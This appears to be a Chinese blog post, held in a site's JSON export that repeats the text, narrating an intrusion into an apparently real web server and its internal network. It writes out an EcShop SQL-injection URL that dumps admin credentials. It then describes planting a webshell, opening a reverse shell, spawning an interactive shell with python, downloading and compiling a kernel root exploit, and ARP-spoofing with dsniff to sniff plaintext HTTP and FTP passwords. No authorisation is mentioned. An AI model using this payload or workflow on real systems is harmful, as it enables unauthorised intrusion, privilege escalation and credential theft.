/>在提权时，要用到gcc进行编译，刺探一下系统有没有安装，执行命令，<br />#gcc &ndash;help<br /><br />发现可以运行gcc,并且系统管理员没对使用shell和gcc进行限制，在也是个安全缺失。<br /><br />在寻找本地提权利用程序时，通常是根据系统版本来进行，应用程序的本地提权也是一样的。在网上就有可供查询的网站，比如<a href=\"http://www.milw0rm.com/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.milw0rm.com/</a>网站如图</p><p><img small=\"0\" src=\"/images/pic/d227f7f8257cc2bcb901a0cb.jpg\" /><br />发现可利用的漏洞还真不少。<br /><br />本地提权是需要个交互式的shell的。在本机监听端口如下：<br /><br />利用WebShell自带的反弹功能直接连接本地的12345端口并返回shell</p><p><img small=\"0\" src=\"/images/pic/d6190e7e92d902d32e73b3d5.jpg\" /></p><p>连接成功后，就能得到一个apache用户的shell<br />，但有时如果不能交互时，可以直接执行，<br /># python &ndash;c &lsquo;impotr pty;pty.spawn(&ldquo;/bin/sh&rdquo;);&rsquo;<br />来得到交互的Shell,一般的系统都默认安装python</p><p><img small=\"0\" src=\"/images/pic/05fa8aff3278251c4f4aead6.jpg\" /></p><p>提示成功了，可以新建个目录用来存放提权的工具。</p><p><img small=\"0\" src=\"/images/pic/162231f3e724d01c720eecde.jpg\" /><br /></p><p>在Linux提权大致可分为，第三方软件漏洞、本地信任特性、内核溢出等，比较常用的溢出率高的，当属内核了。用Wget下载溢出源码，用到的漏洞是Linux vmsplice Local Root Exploit<br />，成功率蛮高的，gcc编译，执行，</p><p><img small=\"0\" src=\"/images/pic/d745d3fc9c311931d9f9fda5.jpg\" /><br /></p><p>成功获取root权限，在选择溢出利用程序时，有时需要进行多次测试。<br /><br />什么是Sniffer，sniffer是利用截获目的的计算机通信，通过分析截获的数据，提取敏感信息的工具。但其通过什么方法来截获数据呢？在此之前得解释一下arp（Address Rrsolution Protocol）协议,即地址解析协议，它位于TCP/IP协议栈中的低层协议，负责将某个IP地址解析成对应的MAC地址。它靠维持在内存中保存的一张表来使IP得以在网络上被目标机器应答。在数据传送时，IP包里就有源IP地址、源MAC地址、目标IP地址，如果在ARP表中有相对应的MAC地点，那么根据最优选择法，直接访问，如果，没有对应的地址，就要广播出去，在网内寻找对应的地址，如果对方的IP地址和发出的目标IP地址相同，那么对方会发送MAC地址给源主机，，而此时，如果攻击者也接听到发送的IP地址，它就会仿冒目标主机的IP地址，然后返回自己的主机的MAC地址给源主机，因为源主机发送的IP包没有包括目标主机的MAC地址，而ARP表里面又没有目标IP和目标MAC地址的对应表，就会接受攻击者的MAC而选择与其通信，所以就此产生了ARP欺骗。在系统刚启动时，可以在DOS下输入命令&ldquo;arp -a&rdquo;来查看本机arp缓存表的内容</p><p><img small=\"0\" src=\"/images/pic/2f3f5f0d314238f13bc763a7.jpg\" /><br />我们来与IP192.168.0.5进行通信，通信后arp缓存表就会有这样一条MAC地址和IP对应的记录</p><p><img small=\"0\" src=\"/images/pic/f4c3451adf8946ca1bd576b1.jpg\" /><br /></p><p>在本机多了条缓存中的IP和MAC的对应纪录。<br /><br />Dsniff是一个著名的网络嗅探工具包，其开发者是Dug Song，其开发的本意是用来揭示网络通信的不安全性，方便网络管理员对自己网络的审计，当然也包括渗透测试，其安装包里某此工具，充分揭示了协议的不安全性。作为一个工具集，Dsniff包括的工具大致分为四类：<br />一、 纯粹被动地进行网络活动监视的工具，包括：dsniff、filesnarf、mailsnaf、msgsnarf、urlsnarf、webspy<br />二、 针对SSH和SSL的MITM&ldquo;攻击&rdquo;工具，包括sshmitm和webmitm<br />三、 发起主动欺骗的工具，包括：arpspoof、dnsspof、macof<br />四、 其它工具，包括tcpkill、tcpnice<br /><br />Dsniff的官方下载：<a href=\"http://www.monkey.org/~dugsong/dsniff/\" target=\"_blank\" rel=\"noopener noreferrer\">www.monkey.org/~dugsong/dsniff/</a> 这个是源码包，解压后可以看下README,提示需要五个软件的支持：openssl、Berkeley_db、libnet、libpca、libnids<br />下载地址如下：<br />Berkeley_db: <a href=\"http://www.oracle.com/technology/software/products/berkeley-db/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.oracle.com/technology ... keley-db/index.html</a><br />libpcap: <a href=\"http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz</a><br /><br /><br /><br />系统一般默认都有安装openssl、libpcap。</\np><ol> <li>一、        Tar包安装<br /> </li> <li>如果下载的是源包，文件如下：openssl-0.9.7i.tar.gz、libnids-1.18.tar.gz、libpcap-0.7.2.tar.gz、libnet-1.0.2a.tar.gz、Berkeley db-4.7.25.tar.gz<br /> </li> <li>a)        安装openssl<br /> </li> <li>用tar解压软件包手，执行三条命令<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>b)        安装libpcap<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>c)        安装libnet<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>d)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>e)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>f)        安装Berkeley DB<br /> </li> <li>#.cd build_unix<br /> </li> <li>#../dist/configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>g)        安装dsniff<br /> </li> <li>#./configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>程序安装好后，先查看一下网卡信息，然后开启服务器IP转发，命令如下：<br /> </li> <li># echo &quot;1&quot; &amp;gt; /proc/sys/net/ipv4/ip_forward</li></ol><em>复制代码</em><p>先来双向欺骗，用到arpspoof，其命令是：<br />#arp &ndash;t 网关 欺骗主机IP</p><p><img small=\"0\" src=\"/images/pic/8ab572e964e6c3eab31cb1bd.jpg\" /></p><p>arpspoof已经开始工作了，可以用tcpdump查看一下被攻击主机是否有数据经过<br />命令如下：<br />#tcpdump &ndash;I eth0 host 61.67.x.115</p><p><img small=\"0\" src=\"/images/pic/f9760116f08cf86ff819b8bf.jpg\" /><br /><br />有数据交换，说明欺骗的比较成功，然后用Dsniff开始嗅探目标主机，命令如下：<br />#Dsniff &ndash;c &ndash;f /etc/dsniff/dsniff.services<br />这个dsniff.services自然就是保存端口和服务对应关系的文件，如需要保存到文件，需加-w filename数据全是明文传送的。所以数据分析完全能用肉眼发现</p><p><img small=\"0\" src=\"/images/pic/30581d2958b3600a349bf7b9.jpg\" /></p><p>从这条数据可以看到HTTP登录和FTP登录信息，帐号和密码全是明文的。而经过测试，通过FTP上传的目录正是WEB目录，获取WEBShell权限，继续提权即可控制主机。Linux下的嗅探，其实更容易一些，在最近爆出的高危本地提权，不知道有多少台主机沦陷呢？在攻与防的游戏里，系统管理员往往显得如此的无助。</p><p> </p>","source":"_posts/Linux下渗透嗅探术.md","raw":"title: Linux下渗透嗅探术\ncategories: [网络安全]\ntags: []\ndate: 2012-04-04 20:29:00\n---\n<p>作者: BEACH JJ</p><p>内网渗透在攻击层面，其实更趋向于社工和常规漏洞检测的结合，为了了解网内防护措施的设置是通过一步步的刺探和经验积累，有时判断出错，也能进入误区。但是如果能在网内进行嗅探，则能事半功倍，处于一个对网内设置完全透明的状态。本文将从一个注点引发的突破，到控制整个内网的全过程来跟大家讨论，内网的渗透嗅探术和安全防护一些内容。<br /><br />在寻找突破时，更多的是从应用服务来，而应用服务最直观的信息采集，就是端口扫描，不同的应用，开放的服务不一样。所以，在对网络进行信息收集时，大概分为这样两步： 端口探测，程序指纹分析。在端口探测方面，个人喜欢用SuperScan来快速对网段里的应用进行判断</p><p><img small=\"0\" src=\"/images/pic/e48eb4505ab5b8213a2935fb.jpg\" /></p><p>在掌握端口信息后，就要对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法等。本文试着对网内一台提供WEB服务的主机作为突破口，提交一个畸形的请求，如图：</p><p><img small=\"0\" src=\"/images/pic/6d6c6dffc2a50b286d22ebc6.jpg\" /><br /></p><p>从上图可以读取以下信息：<br />系统类型：Fedora<br />应用程序：apache/2.2.4<br />以上只是很简单的手工对程序指纹进行分析，当然在针对web应用的扫描器，还有很多，比较常用的wvs、appscan等。用轻量级的&rdquo;wwwwscan&rdquo;来扫描</p><p><img small=\"0\" src=\"/images/pic/965d283ccf22b3ccb211c7c1.jpg\" /><br /></p><p>由扫描的结果可以看到，与手工探测的结果是一致的。<br /><br />通上面简单的信息收集后，可以了解到网站架构是apache+mysql+php,直接请求URL：<a href=\"http://61.67.xx.116/htdocs/\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/</a></p><p><img small=\"0\" src=\"/images/pic/cd17c5fe6532bbe0b48f31c3.jpg\" /><br /></p><p>发现此站是EcShop架构的站点，其使用的版本信息是V2.5.0。EcShop的版本是存在许多的注入点的。其中user.php文件有个注入漏洞，直接请求URL如下：<br /><a href=\"http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=</a>&rsquo; union select 1,2,3,4,5,6,concat(user_name,0×7c,password,0×7c,email),8 from ecs_admin_user/*</p><p><img small=\"0\" src=\"/images/pic/533a63b1588c5df036d3cace.jpg\" /><br />获取管理员帐号和密码，ECShop使用的是MD5加密，直接解密。原来密码是admin，有点意料之外。访问管理后台，修改模版处，插入一句木马，即可得到WEBSEHLL，如图：</p><p><img small=\"0\" src=\"/images/pic/e2b6e8a6a79c7993cbefd0c8.jpg\" /><br /></p><p>在获取WEBshell权限后，就需要对系统进行分析，查找Exp了。执行命令如下：<br />#uname &ndash;a<br /><br />返回的信息是&ldquo;Linux fedora 2.6.20-1.2962.fc6 &rdquo;，Linux内核是2.6.20的。<br />在提权时，要用到gcc进行编译，刺探一下系统有没有安装，执行命令，<br />#gcc &ndash;help<br /><br />发现可以运行gcc,并且系统管理员没对使用shell和gcc进行限制，在也是个安全缺失。<br /><br />在寻找本地提权利用程序时，通常是根据系统版本来进行，应用程序的本地提权也是一样的。在网上就有可供查询的网站，比如<a href=\"http://www.milw0rm.com/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.milw0rm.com/</a>网站如图</p><p><img small=\"0\" src=\"/images/pic/d227f7f8257cc2bcb901a0cb.jpg\" /><br />发现可利用的漏洞还真不少。<br /><br />本地提权是需要个交互式的shell的。在本机监听端口如下：<br /><br />利用WebShell自带的反弹功能直接连接本地的12345端口并返回shell</p><p><img small=\"0\" src=\"/images/pic/d6190e7e92d902d32e73b3d5.jpg\" /></p><p>连接成功后，就能得到一个apache用户的shell<br />，但有时如果不能交互时，可以直接执行，<br /># python &ndash;c &lsquo;impotr pty;pty.spawn(&ldquo;/bin/sh&rdquo;);&rsquo;<br />来得到交互的Shell,一般的系统都默认安装python</p><p><img small=\"0\" src=\"/images/pic/05fa8aff3278251c4f4aead6.jpg\" /></p><p>提示成功了，可以新建个目录用来存放提权的工具。</p><p><img small=\"0\" src=\"/images/pic/162231f3e724d01c720eecde.jpg\" /><br /></p><p>在Linux提权大致可分为，第三方软件漏洞、本地信任特性、内核溢出等，比较常用的溢出率高的，当属内核了。用Wget下载溢出源码，用到的漏洞是Linux vmsplice Local Root Exploit<br />，成功率蛮高的，gcc编译，执行，</p><p><img small=\"0\" src=\"/images/pic/d745d3fc9c311931d9f9fda5.jpg\" /><br /></p><p>成功获取root权限，在选择溢出利用程序时，有时需要进行多次测试。<br /><br />什么是Sniffer，sniffer是利用截获目的的计算机通信，通过分析截获的数据，提取敏感信息的工具。但其通过什么方法来截获数据呢？在此之前得解释一下arp（Address Rrsolution Protocol）协议,即地址解析协议，它位于TCP/IP协议栈中的低层协议，负责将某个IP地址解析成对应的MAC地址。它靠维持在内存中保存的一张表来使IP得以在网络上被目标机器应答。在数据传送时，IP包里就有源IP地址、源MAC地址、目标IP地址，如果在ARP表中有相对应的MAC地点，那么根据最优选择法，直接访问，如果，没有对应的地址，就要广播出去，在网内寻找对应的地址，如果对方的IP地址和发出的目标IP地址相同，那么对方会发送MAC地址给源主机，，而此时，如果攻击者也接听到发送的IP地址，它就会仿冒目标主机的IP地址，然后返回自己的主机的MAC地址给源主机，因为源主机发送的IP包没有包括目标主机的MAC地址，而ARP表里面又没有目标IP和目标MAC地址的对应表，就会接受攻击者的MAC而选择与其通信，所以就此产生了ARP欺骗。在系统刚启动时，可以在DOS下输入命令&ldquo;arp -a&rdquo;来查看本机arp缓存表的内容</p><p><img small=\"0\" src=\"/images/pic/2f3f5f0d314238f13bc763a7.jpg\" /><br />我们来与IP192.168.0.5进行通信，通信后arp缓存表就会有这样一条MAC地址和IP对应的记录</p><p><img small=\"0\" src=\"/images/pic/f4c3451adf8946ca1bd576b1.jpg\" /><br /></p><p>在本机多了条缓存中的IP和MAC的对应纪录。<br /><br />Dsniff是一个著名的网络嗅探工具包，其开发者是Dug Song，其开发的本意是用来揭示网络通信的不安全性，方便网络管理员对自己网络的审计，当然也包括渗透测试，其安装包里某此工具，充分揭示了协议的不安全性。作为一个工具集，Dsniff包括的工具大致分为四类：<br />一、 纯粹被动地进行网络活动监视的工具，包括：dsniff、filesnarf、mailsnaf、msgsnarf、urlsnarf、webspy<br />二、 针对SSH和SSL的MITM&ldquo;攻击&rdquo;工具，包括sshmitm和webmitm<br />三、 发起主动欺骗的工具，包括：arpspoof、dnsspof、macof<br />四、 其它工具，包括tcpkill、tcpnice<br /><br />Dsniff的官方下载：<a href=\"http://www.monkey.org/~dugsong/dsniff/\" target=\"_blank\" rel=\"noopener noreferrer\">www.monkey.org/~dugsong/dsniff/</a> 这个是源码包，解压后可以看下README,提示需要五个软件的支持：openssl、Berkeley_db、libnet、libpca、libnids<br />下载地址如下：<br />Berkeley_db: <a href=\"http://www.oracle.com/technology/software/products/berkeley-db/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.oracle.com/technology ... keley-db/index.html</a><br />libpcap: <a href=\"http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz</a><br /><br /><br /><br />系统一般默认都有安装openssl、libpcap。</\np><ol> <li>一、        Tar包安装<br /> </li> <li>如果下载的是源包，文件如下：openssl-0.9.7i.tar.gz、libnids-1.18.tar.gz、libpcap-0.7.2.tar.gz、libnet-1.0.2a.tar.gz、Berkeley db-4.7.25.tar.gz<br /> </li> <li>a)        安装openssl<br /> </li> <li>用tar解压软件包手，执行三条命令<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>b)        安装libpcap<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>c)        安装libnet<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>d)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>e)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>f)        安装Berkeley DB<br /> </li> <li>#.cd build_unix<br /> </li> <li>#../dist/configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>g)        安装dsniff<br /> </li> <li>#./configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>程序安装好后，先查看一下网卡信息，然后开启服务器IP转发，命令如下：<br /> </li> <li># echo &quot;1&quot; &amp;gt; /proc/sys/net/ipv4/ip_forward</li></ol><em>复制代码</em><p>先来双向欺骗，用到arpspoof，其命令是：<br />#arp &ndash;t 网关 欺骗主机IP</p><p><img small=\"0\" src=\"/images/pic/8ab572e964e6c3eab31cb1bd.jpg\" /></p><p>arpspoof已经开始工作了，可以用tcpdump查看一下被攻击主机是否有数据经过<br />命令如下：<br />#tcpdump &ndash;I eth0 host 61.67.x.115</p><p><img small=\"0\" src=\"/images/pic/f9760116f08cf86ff819b8bf.jpg\" /><br /><br />有数据交换，说明欺骗的比较成功，然后用Dsniff开始嗅探目标主机，命令如下：<br />#Dsniff &ndash;c &ndash;f /etc/dsniff/dsniff.services<br />这个dsniff.services自然就是保存端口和服务对应关系的文件，如需要保存到文件，需加-w filename数据全是明文传送的。所以数据分析完全能用肉眼发现</p><p><img small=\"0\" src=\"/images/pic/30581d2958b3600a349bf7b9.jpg\" /></p><p>从这条数据可以看到HTTP登录和FTP登录信息，帐号和密码全是明文的。而经过测试，通过FTP上传的目录正是WEB目录，获取WEBShell权限，继续提权即可控制主机。Linux下的嗅探，其实更容易一些，在最近爆出的高危本地提权，不知道有多少台主机沦陷呢？在攻与防的游戏里，系统管理员往往显得如此的无助。</p><p> </p>","slug":"Linux下渗透嗅探术","published":1,"updated":"2023-04-22T05:47:16.777Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrk6tpu00018opi18qiar54","content":"<p>作者: BEACH JJ</p><p>内网渗透在攻击层面，其实更趋向于社工和常规漏洞检测的结合，为了了解网内防护措施的设置是通过一步步的刺探和经验积累，有时判断出错，也能进入误区。但是如果能在网内进行嗅探，则能事半功倍，处于一个对网内设置完全透明的状态。本文将从一个注点引发的突破，到控制整个内网的全过程来跟大家讨论，内网的渗透嗅探术和安全防护一些内容。<br /><br />在寻找突破时，更多的是从应用服务来，而应用服务最直观的信息采集，就是端口扫描，不同的应用，开放的服务不一样。所以，在对网络进行信息收集时，大概分为这样两步： 端口探测，程序指纹分析。在端口探测方面，个人喜欢用SuperScan来快速对网段里的应用进行判断</p><p><img small=\"0\" src=\"/images/pic/e48eb4505ab5b8213a2935fb.jpg\" /></p><p>在掌握端口信息后，就要对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法等。本文试着对网内一台提供WEB服务的主机作为突破口，提交一个畸形的请求，如图：</p><p><img small=\"0\" src=\"/images/pic/6d6c6dffc2a50b286d22ebc6.jpg\" /><br /></p><p>从上图可以读取以下信息：<br />系统类型：Fedora<br />应用程序：apache/2.2.4<br />以上只是很简单的手工对程序指纹进行分析，当然在针对web应用的扫描器，还有很多，比较常用的wvs、appscan等。用轻量级的&rdquo;wwwwscan&rdquo;来扫描</p><p><img small=\"0\" src=\"/images/pic/965d283ccf22b3ccb211c7c1.jpg\" /><br /></p><p>由扫描的结果可以看到，与手工探测的结果是一致的。<br /><br />通上面简单的信息收集后，可以了解到网站架构是apache+mysql+php,直接请求URL：<a href=\"http://61.67.xx.116/htdocs/\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/</a></p><p><img small=\"0\" src=\"/images/pic/cd17c5fe6532bbe0b48f31c3.jpg\" /><br /></p><p>发现此站是EcShop架构的站点，其使用的版本信息是V2.5.0。EcShop的版本是存在许多的注入点的。其中user.php文件有个注入漏洞，直接请求URL如下：<br /><a href=\"http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=</a>&rsquo; union select 1,2,3,4,5,6,concat(user_name,0×7c,password,0×7c,email),8 from ecs_admin_user/*</p><p><img small=\"0\" src=\"/images/pic/533a63b1588c5df036d3cace.jpg\" /><br />获取管理员帐号和密码，ECShop使用的是MD5加密，直接解密。原来密码是admin，有点意料之外。访问管理后台，修改模版处，插入一句木马，即可得到WEBSEHLL，如图：</p><p><img small=\"0\" src=\"/images/pic/e2b6e8a6a79c7993cbefd0c8.jpg\" /><br /></p><p>在获取WEBshell权限后，就需要对系统进行分析，查找Exp了。执行命令如下：<br />#uname &ndash;a<br /><br />返回的信息是&ldquo;Linux fedora 2.6.20-1.2962.fc6 &rdquo;，Linux内核是2.6.20的。<br />在提权时，要用到gcc进行编译，刺探一下系统有没有安装，执行命令，<br />#gcc &ndash;help<br /><br />发现可以运行gcc,并且系统管理员没对使用shell和gcc进行限制，在也是个安全缺失。<br /><br />在寻找本地提权利用程序时，通常是根据系统版本来进行，应用程序的本地提权也是一样的。在网上就有可供查询的网站，比如<a href=\"http://www.milw0rm.com/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.milw0rm.com/</a>网站如图</p><p><img small=\"0\" src=\"/images/pic/d227f7f8257cc2bcb901a0cb.jpg\" /><br />发现可利用的漏洞还真不少。<br /><br />本地提权是需要个交互式的shell的。在本机监听端口如下：<br /><br />利用WebShell自带的反弹功能直接连接本地的12345端口并返回shell</p><p><img small=\"0\" src=\"/images/pic/d6190e7e92d902d32e73b3d5.jpg\" /></p><p>连接成功后，就能得到一个apache用户的shell<br />，但有时如果不能交互时，可以直接执行，<br /># python &ndash;c &lsquo;impotr pty;pty.spawn(&ldquo;/bin/sh&rdquo;);&rsquo;<br />来得到交互的Shell,一般的系统都默认安装python</p><p><img small=\"0\" src=\"/images/pic/05fa8aff3278251c4f4aead6.jpg\" /></p><p>提示成功了，可以新建个目录用来存放提权的工具。</p><p><img small=\"0\" src=\"/images/pic/162231f3e724d01c720eecde.jpg\" /><br /></p><p>在Linux提权大致可分为，第三方软件漏洞、本地信任特性、内核溢出等，比较常用的溢出率高的，当属内核了。用Wget下载溢出源码，用到的漏洞是Linux vmsplice Local Root Exploit<br />，成功率蛮高的，gcc编译，执行，</p><p><img small=\"0\" src=\"/images/pic/d745d3fc9c311931d9f9fda5.jpg\" /><br /></p><p>成功获取root权限，在选择溢出利用程序时，有时需要进行多次测试。<br /><br />什么是Sniffer，sniffer是利用截获目的的计算机通信，通过分析截获的数据，提取敏感信息的工具。但其通过什么方法来截获数据呢？在此之前得解释一下arp（Address Rrsolution Protocol）协议,即地址解析协议，它位于TCP/IP协议栈中的低层协议，负责将某个IP地址解析成对应的MAC地址。它靠维持在内存中保存的一张表来使IP得以在网络上被目标机器应答。在数据传送时，IP包里就有源IP地址、源MAC地址、目标IP地址，如果在ARP表中有相对应的MAC地点，那么根据最优选择法，直接访问，如果，没有对应的地址，就要广播出去，在网内寻找对应的地址，如果对方的IP地址和发出的目标IP地址相同，那么对方会发送MAC地址给源主机，，而此时，如果攻击者也接听到发送的IP地址，它就会仿冒目标主机的IP地址，然后返回自己的主机的MAC地址给源主机，因为源主机发送的IP包没有包括目标主机的MAC地址，而ARP表里面又没有目标IP和目标MAC地址的对应表，就会接受攻击者的MAC而选择与其通信，所以就此产生了ARP欺骗。在系统刚启动时，可以在DOS下输入命令&ldquo;arp -a&rdquo;来查看本机arp缓存表的内容</p><p><img small=\"0\" src=\"/images/pic/2f3f5f0d314238f13bc763a7.jpg\" /><br />我们来与IP192.168.0.5进行通信，通信后arp缓存表就会有这样一条MAC地址和IP对应的记录</p><p><img small=\"0\" src=\"/images/pic/f4c3451adf8946ca1bd576b1.jpg\" /><br /></p><p>在本机多了条缓存中的IP和MAC的对应纪录。<br /><br />Dsniff是一个著名的网络嗅探工具包，其开发者是Dug Song，其开发的本意是用来揭示网络通信的不安全性，方便网络管理员对自己网络的审计，当然也包括渗透测试，其安装包里某此工具，充分揭示了协议的不安全性。作为一个工具集，Dsniff包括的工具大致分为四类：<br />一、 纯粹被动地进行网络活动监视的工具，包括：dsniff、filesnarf、mailsnaf、msgsnarf、urlsnarf、webspy<br />二、 针对SSH和SSL的MITM&ldquo;攻击&rdquo;工具，包括sshmitm和webmitm<br />三、 发起主动欺骗的工具，包括：arpspoof、dnsspof、macof<br />四、 其它工具，包括tcpkill、tcpnice<br /><br />Dsniff的官方下载：<a href=\"http://www.monkey.org/~dugsong/dsniff/\" target=\"_blank\" rel=\"noopener noreferrer\">www.monkey.org/~dugsong/dsniff/</a> 这个是源码包，解压后可以看下README,提示需要五个软件的支持：openssl、Berkeley_db、libnet、libpca、libnids<br />下载地址如下：<br />Berkeley_db: <a href=\"http://www.oracle.com/technology/software/products/berkeley-db/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.oracle.com/technology ... keley-db/index.html</a><br />libpcap: <a href=\"http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz</a><br /><br /><br /><br />系统一般默认都有安装openssl、libpcap。</\np><ol> <li>一、        Tar包安装<br /> </li> <li>如果下载的是源包，文件如下：openssl-0.9.7i.tar.gz、libnids-1.18.tar.gz、libpcap-0.7.2.tar.gz、libnet-1.0.2a.tar.gz、Berkeley db-4.7.25.tar.gz<br /> </li> <li>a)        安装openssl<br /> </li> <li>用tar解压软件包手，执行三条命令<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>b)        安装libpcap<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>c)        安装libnet<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>d)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>e)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>f)        安装Berkeley DB<br /> </li> <li>#.cd build_unix<br /> </li> <li>#../dist/configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>g)        安装dsniff<br /> </li> <li>#./configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>程序安装好后，先查看一下网卡信息，然后开启服务器IP转发，命令如下：<br /> </li> <li># echo &quot;1&quot; &amp;gt; /proc/sys/net/ipv4/ip_forward</li></ol><em>复制代码</em><p>先来双向欺骗，用到arpspoof，其命令是：<br />#arp &ndash;t 网关 欺骗主机IP</p><p><img small=\"0\" src=\"/images/pic/8ab572e964e6c3eab31cb1bd.jpg\" /></p><p>arpspoof已经开始工作了，可以用tcpdump查看一下被攻击主机是否有数据经过<br />命令如下：<br />#tcpdump &ndash;I eth0 host 61.67.x.115</p><p><img small=\"0\" src=\"/images/pic/f9760116f08cf86ff819b8bf.jpg\" /><br /><br />有数据交换，说明欺骗的比较成功，然后用Dsniff开始嗅探目标主机，命令如下：<br />#Dsniff &ndash;c &ndash;f /etc/dsniff/dsniff.services<br />这个dsniff.services自然就是保存端口和服务对应关系的文件，如需要保存到文件，需加-w filename数据全是明文传送的。所以数据分析完全能用肉眼发现</p><p><img small=\"0\" src=\"/images/pic/30581d2958b3600a349bf7b9.jpg\" /></p><p>从这条数据可以看到HTTP登录和FTP登录信息，帐号和密码全是明文的。而经过测试，通过FTP上传的目录正是WEB目录，获取WEBShell权限，继续提权即可控制主机。Linux下的嗅探，其实更容易一些，在最近爆出的高危本地提权，不知道有多少台主机沦陷呢？在攻与防的游戏里，系统管理员往往显得如此的无助。</p><p> </p>","site":{"data":{}},"excerpt":"","more":"<p>作者: BEACH JJ</p><p>内网渗透在攻击层面，其实更趋向于社工和常规漏洞检测的结合，为了了解网内防护措施的设置是通过一步步的刺探和经验积累，有时判断出错，也能进入误区。但是如果能在网内进行嗅探，则能事半功倍，处于一个对网内设置完全透明的状态。本文将从一个注点引发的突破，到控制整个内网的全过程来跟大家讨论，内网的渗透嗅探术和安全防护一些内容。<br /><br />在寻找突破时，更多的是从应用服务来，而应用服务最直观的信息采集，就是端口扫描，不同的应用，开放的服务不一样。所以，在对网络进行信息收集时，大概分为这样两步： 端口探测，程序指纹分析。在端口探测方面，个人喜欢用SuperScan来快速对网段里的应用进行判断</p><p><img small=\"0\" src=\"/images/pic/e48eb4505ab5b8213a2935fb.jpg\" /></p><p>在掌握端口信息后，就要对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法等。本文试着对网内一台提供WEB服务的主机作为突破口，提交一个畸形的请求，如图：</p><p><img small=\"0\" src=\"/images/pic/6d6c6dffc2a50b286d22ebc6.jpg\" /><br /></p><p>从上图可以读取以下信息：<br />系统类型：Fedora<br />应用程序：apache/2.2.4<br />以上只是很简单的手工对程序指纹进行分析，当然在针对web应用的扫描器，还有很多，比较常用的wvs、appscan等。用轻量级的&rdquo;wwwwscan&rdquo;来扫描</p><p><img small=\"0\" src=\"/images/pic/965d283ccf22b3ccb211c7c1.jpg\" /><br /></p><p>由扫描的结果可以看到，与手工探测的结果是一致的。<br /><br />通上面简单的信息收集后，可以了解到网站架构是apache+mysql+php,直接请求URL：<a href=\"http://61.67.xx.116/htdocs/\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/</a></p><p><img small=\"0\" src=\"/images/pic/cd17c5fe6532bbe0b48f31c3.jpg\" /><br /></p><p>发现此站是EcShop架构的站点，其使用的版本信息是V2.5.0。EcShop的版本是存在许多的注入点的。其中user.php文件有个注入漏洞，直接请求URL如下：<br /><a href=\"http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=</a>&rsquo; union select 1,2,3,4,5,6,concat(user_name,0×7c,password,0×7c,email),8 from ecs_admin_user/*</p><p><img small=\"0\" src=\"/images/pic/533a63b1588c5df036d3cace.jpg\" /><br />获取管理员帐号和密码，ECShop使用的是MD5加密，直接解密。原来密码是admin，有点意料之外。访问管理后台，修改模版处，插入一句木马，即可得到WEBSEHLL，如图：</p><p><img small=\"0\" src=\"/images/pic/e2b6e8a6a79c7993cbefd0c8.jpg\" /><br /></p><p>在获取WEBshell权限后，就需要对系统进行分析，查找Exp了。执行命令如下：<br />#uname &ndash;a<br /><br />返回的信息是&ldquo;Linux fedora 